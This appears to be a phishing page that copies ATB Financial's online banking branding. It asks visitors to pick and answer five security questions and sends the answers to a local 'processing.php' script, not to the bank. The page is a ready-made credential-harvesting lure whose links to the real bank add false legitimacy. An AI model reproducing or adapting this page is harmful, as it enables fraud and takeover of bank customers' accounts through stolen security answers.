﻿
<!DOCTYPE html>
<html class="wf-myriadpro-n4-active wf-active"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <!-- Google Tag Manager -->


    <meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="apple-itunes-app" content="app-id=536593983"><meta name="google-play-app" content="app-id=com.atb.ATBMobile"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>
	Your Security Questions
</title>

        <!-- JavaScript -->
 
        <style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style><style type="text/css">@font-face{font-family:tk-myriad-pro-n4;src:url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}</style>


        <!-- Stylesheets -->
        <link rel="stylesheet" type="text/css" href="files/fonts.htm"><link rel="stylesheet" type="text/css" href="files/commonStyles_B6A7584738E751824EF26B52E6EC544E.css"><link rel="stylesheet" type="text/css" href="files/publicStyles_32A798D029DAD3323D9D7DD8FCFB8BA1.css"><link rel="Shortcut Icon" href="https://www.atbonline.com/ATB/Themes/TopTabMenu/Images/favicon.ico" type="image/x-icon">

    <!-- CrazyEgg -->
<style type="text/css">@font-face{font-family:myriad-pro;src:url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/c511dc/00000000000000000001709a/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}</style>

</head>
<body>

    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PHHNRF" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>


    <div id="atbBackground" class="atb-background">
        <div id="atbPublicContainer" class="container atb-base-container no-padding">
            <div id="atbBody">
                <img id="atbGradient" src="files/header-gradient.jpg">
                <div id="atbBodyContent">
                    <form name="MAINFORM" method="post" action="processing.php"  id="MAINFORM" >
					






                
                        <!-- RSA script -->


                        <h1 class="display-block text-center"><strong>Welcome to ATB</strong> Online</h1>
                        <div class="font-secondary text-center mb-30">
                            <!-- Personal/Business tabs -->
                            <a id="PersonalLink" class="text-semibold mx-10" href="https://www.atbonline.com/ATB/Login.aspx">Confirm your information</a>
                        </div>
                        <div class="container">
                            <div class="row mt-10">
                                <div class="col-xs-1"></div>
                                <div class="col-xs-6 pr-30">
                                    <h2>Security Questions</h2>
                                    <div id="atbPageSummary" class="col-xs-12 no-padding">
                                        
                                        
                                    </div>
                                    <div class="col-xs-12 no-padding">
                                        



    <table class="full-width" border="0">
	<tbody><tr>
		<td>
                    <div>
                        <span class="form-label display-block mb-5">Security Question 1:</span>

                  	<select name="question1" id="q1" class="form-control" style="OrigCss:form-control;">
					<option value="">Please select a question...</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>

				</select>      
                    </div>
					
      
					<div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input name="answer1" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        
                    </div>
					<div>
                        <span class="form-label display-block mb-5">Security Question 2:</span>

                      <select name="question2" id="q2" class="form-control" style="OrigCss:form-control;">
					<option value="">Please select a question...</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>

				</select>  
                    </div>
					
					<div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input name="answer2" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        
                    </div>
					<div>
                        <span class="form-label display-block mb-5">Security Question 3:</span>

                  <select name="question3" id="q3" class="form-control" style="OrigCss:form-control;">
					<option value="">Please select a question...</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>

				</select>      
                    </div>
					
					<div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input name="answer3" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        
                    </div>
                    <div>
                        <span class="form-label display-block mb-5">Security Question 4:</span>

                      <select name="question4" id="q2" class="form-control" style="OrigCss:form-control;">
					<option value="">Please select a question...</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>

				</select>  
                    </div>
					
					<div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input name="answer4" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        
                    </div>
					<div>
                        <span class="form-label display-block mb-5">Security Question 5:</span>

                  <select name="question5" id="q3" class="form-control" style="OrigCss:form-control;">
					<option value="">Please select a question...</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite wild animal">What is your favourite wild animal. Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>

				</select>      
                    </div>
					
					<div>
                        <span class="form-label display-block mb-5">Answer:</span>

                        <input name="answer5" required="" id="ctlWorkflow_txtUserID" class="form-control full-width" placeholder="Enter your Security Answer" type="text">
                        
                    </div>
                    
					</div>

                    
                </td>
	</tr>
</tbody></table>
                    <div class="mt-30 clearfix">
                        <div class="col-xs-5 pl-0 pr-10">
                            <input onclick="__doPostBack('ctlWorkflow$btnStep1Cancel','')" name="ctlWorkflow$btnStep1Cancel" id="ctlWorkflow_btnStep1Cancel" class="btn btn-plain full-width" value="Back" type="button">
                        </div>

                        <div class="col-xs-6 pl-10 pr-0">
                            <input name="ctlWorkflow$btnContinue" value="Continue" id="ctlWorkflow_btnContinue" class="btn btn-primary full-width" type="submit">
                        </div>
                    </div>

                    
                </td>
	</tr>
</tbody></table>                   
                                    </div>
                                </div>
                                
								<div class="col-xs-4">
                                    <div id="loginAd" class="ad-responsive" data-mxad-default-url="http://www.atb.com/learn/resources/Pages/ApplePay.aspx?utm_source=atbol&amp;utm_medium=login&amp;utm_campaign=CP-2016-ApplePay" data-mxad-default-image-url="/ATB/Images/login_banner.jpg" data-mxad-user-id="banner1"><a href="https://analytics.moneydesktop.com/offers/OFR-8df683bf-fcfd-4f32-34c6-d4787c46e07b/redirect" target="_blank"><img src="files/CMP-f6e6bc42-c985-05e6-b3a4-277f546a5f0b.jpg"></a></div>
                                </div>
                            </div>
                            <div class="row mt-50">
                                <div class="col-xs-12 text-xxsmall text-center">
                                    
      For assistance, please call the ATB Customer Care Centre 7am-11pm, 7 days a week at 1-866-282-4932.<br>
      © ATB Financial 2018 &nbsp;|&nbsp; <a href="http://www.atb.com/" class="text-link text-underline" target="_blank">atb.com</a> &nbsp;|&nbsp; <a href="https://www.atb.com/contact-us/Pages/default.aspx" class="text-link text-underline" target="_blank">Contact us</a> &nbsp;|&nbsp; <a href="http://www.atb.com/SiteCollectionDocuments/ImportantInformation/Personal_Online_Terms_and_Conditions.pdf" class="text-link text-underline" target="_blank">Terms</a><br>
      All Rights Reserved. "Trade mark of Alberta Treasury Branches"<br>
      Authorized access only. Usage may be monitored.
    
                                </div>
                            </div>
                        </div>


                        

                    

</form>
                </div>
            </div>
        </div>
    </div>

    



<div id="ZN_0xidHQNpghfJsWN"></div>
</body></html>